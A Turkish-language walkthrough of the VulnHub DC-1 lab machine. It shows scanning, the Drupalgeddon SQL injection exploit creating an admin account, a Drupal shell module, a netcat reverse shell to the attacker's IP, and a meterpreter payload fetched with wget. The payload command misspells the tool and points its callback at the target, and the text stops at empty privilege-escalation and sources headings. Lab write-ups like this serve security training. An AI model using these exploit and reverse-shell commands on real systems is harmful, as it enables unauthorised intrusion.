<h1>DC-1: 1 Kutusunun Çözümü</h1>
<strong>Yazar:<strong>Beren Kuday GÖRÜN<br>
<strong>Tarih:</strong>06.05.2019<br>
<strong>IP:</strong>192.168.171.136<br>
<strong>Not:</strong>Kutunun indirme adresi 'kutu' isimli klasöre eklenmiştir.<br>
<strong>Sayfa:</strong>https://www.vulnhub.com/entry/dc-1-1,292/
<hr>
<h3>1.	Bilgi Toplama</h3>
<h4>IP Tespiti</h4>
<pre>
arp-scan -l
</pre>
<pre>
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.171.1	00:50:56:c0:00:08	VMware, Inc.
192.168.171.2	00:50:56:ff:0c:9c	VMware, Inc.
192.168.171.138	00:0c:29:d4:e6:01	VMware, Inc.
192.168.171.254	00:50:56:e4:50:27	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.5: 256 hosts scanned in 2.717 seconds (94.22 hosts/sec). 4 responded
</pre>
<p>Heden kutunun IP adresi 192.168.171.138</p>
<h4>Servis Tespiti</h4>
<pre>nmap -p- -A 192.168.171.138</pre>
<pre>
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 14:34 EDT
Nmap scan report for 192.168.171.138
Host is up (0.00064s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          41022/udp  status
|_  100024  1          50460/tcp  status
50460/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:D4:E6:01 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 192.168.171.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.13 seconds
</pre>
<p>22. portta ssh olduğunu gördükten sonra ilk olarak root kullanıcısı için hydra ile bruteforce saldırısını başlattım. Ancak bir sonuç çıkartamadım. Daha sonrasında 80. porta yöneldim ve sayfayı gördüğümde bunun bir Drupal sitesi olduğunu gördüm. Üniversite 2. sınıfta Bilgi İşlem Departmanında yarı zamanlı çalışırken kullandığımız bir web uygulamasıydı. Kısaca özet geçecek olursam wordpress gibi bir uygulama ama daha çok CMS sistemleri için geliştirilmiş ve bireysel sitelerden ziyade kurumları baz alan bir platform. Güvenlik açısından eklentiri wordpress'ten çok çok daha iyidir. Eklenti olarak üzerinde WAF uygulamaları vardır. Olası saldırılarda IP adreslerinin otomatik olarak bloke edilmesi gibi ücretsiz özellikleri bulunuyor. Bunun haricinde yanlış hatırlamıyorsa wordpress'e karşın bütün eklentileri ücretsizdi diye hatırlıyorum. Hedef üzerinde Drupal olması beni motive etti, tecrübeler iyidir.</p>
<p>İlk olarak tabikide wordpress'te olduğu gibi robots.txt dosyasını kontrol etmek mantıklı olacaktır. Burada bir sürü bağlantı görülecektir. Ancak bazı linklere MiddleWare yüzünden ulaşamayacağız. Her şey tanıdık geliyor.</p>
<p>Belirli bir uygulama barındıran zafiyetli kutularda aslında yapımcı kişinin hayal gücümüzü kullanarak bir açık bulmaktan ziyade uygulamanın açıklarını araştırmaya bizi yönelttiğini düşünüyorum bundan dolayı nmap çıktısı ile aldığım sonuçlarda Drupal 7 olduğunu gördüm ve bu şekilde açık kaynaklardan exploit araması yaparak yola devam edelim.</p>

<pre>searchsploit drupal 7</pre>
<pre>
--------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                 |  Path
                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------- ----------------------------------------
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution    | exploits/php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                  | exploits/php/webapps/27020.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin Us | exploits/php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Sessio | exploits/php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset  | exploits/php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset  | exploits/php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code  | exploits/php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                         | exploits/php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution             | exploits/php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution        | exploits/php/webapps/3313.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                  | exploits/php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                              | exploits/php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (M | exploits/php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Ex | exploits/php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2'  | exploits/php/webapps/44449.rb
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persist | exploits/php/webapps/25493.txt
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution  | exploits/php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site  | exploits/php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbit | exploits/php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/M | exploits/php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasplo | exploits/php/remote/40130.rb
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclos | exploits/php/webapps/44501.txt
--------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
</pre>
<p>'Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin Us | exploits/php/webapps/34992.py' satırındaki python kodunu kullanabiliriz.</p>
<pre>
python /usr/share/exploitdb/exploits/php/webapps/34992.py -h
</pre>
<pre>
Usage: 34992.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
</pre>
<p>İsterleri doldurarak kodu çalıştıralım...</p>

<hr>
<h3>3	Sisteme Sızma</h3>
<pre>
python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.138 -u kuday -p kuday
</pre>
<pre>
  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww


[!] VULNERABLE!

[!] Administrator user created!

[*] Login: kuday
[*] Pass: kuday
[*] Url: http://192.168.171.138/?q=node&destination=node

</pre>
<p>Yukarıdaki bağlantıya giderek kullanıcı adı ve şifremiz ile sisteme giriş yapalım.</p>
<p>Sisteme giriş yaptıktan sonra menü kısmından Modules<br>Açılan sayfada ise Install new module bağlantısına tıklayarak modüle yükleme sayfasına ilerledim.</p>
<p>Bunu neden yaptık peki? Üst kısımlarda Drupal'ı anlatırken eklentilerinin ücretsiz olduğunu belirtmiştim. https://www.drupal.org/project/shell adresinden modülü direkt olarka indirebilirsiniz ya da https://ftp.drupal.org/files/projects/shell-7.x-1.0-beta5.tar.gz adresini kullanabilirsiniz.<br>ÖNEMLİ NOT: Unutmayınki biizm uygulamamızın sürüm 7, eğer 8. sürüm için yazılmış bir shell modülü indirip yüklemeye çalışırsanız başarılı olmayacaktır.</p>
<p>Şimdi tekrardan Modules kısmında gelerek ismi Shell olan modülümüzü etkinleştirmemiz gerekmektedir. Bu işlemi yaptıktan sonra Konfigürasyon Ayarlarımızı kaydetmemiz gerekmektedir.</p>
<p>Şimdi Dashboard->kuday->Shell şeklinde ilerleyerek. Kabuğumuza ulaşıyoruz. Artık reverse shell alma vakti. Shell'e aşağıdaki kodu yazabilir ya da istediğiniz bir shell kodu yazabilirsiniz. İçeride gezindiğinizde bazı flagler göreceksinizdir. Flaglere yönelmekten ziyade amacımız root olmak olacaktır.</p>
<p>Tabiki ilk onca gelecek bağlantıyı yakalayabilmek için bir dinleme noktası açmalıyız.</p>
<pre>nc -lvp 1822</pre>
<p>Şimdi aşağıdaki kodu karşı hedefe yazalım.</p>
<pre>nc 192.168.171.136 1822 -e /bin/bash</pre>
<p>Daha iyi bir shell ortamı oluşturmak için meterpreter kullanmak istiyorum. Bu benim vazgeçemediğim bir alışkanlığım. Bundan dolayı ilk başta sistemde python kontrolü yaptıktan sonra kalim üzerinde bir python meterpreter reverse shell çıkarttım. Bu dosyayı daha sonrasında wget ile hedef makinaya çekip kendimde dnleme noktası oluşturup daha iyi bir shell ortamı elde etmiş oldum.</p>
<pre>sfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.171.138 LPORT=4444</pre>
<p>Çıktıyı python_reverse_meterpreter.py dosyasına yazdım ve python ile mini server oluşturup hedef makineden python dosyasını indirip çalıştırdım.</p>
<pre>
root@kali:~/Documents/Kutular/DC-1/dosyalar# python -m SimpleHTTPServer 1823
</pre><pre>Serving HTTP on 0.0.0.0 port 1823 ...
</pre>

<hr>
<h3>4	Yetki Yükseltme</h3>

<h4>Kaynaklar:<h4>

</pre>

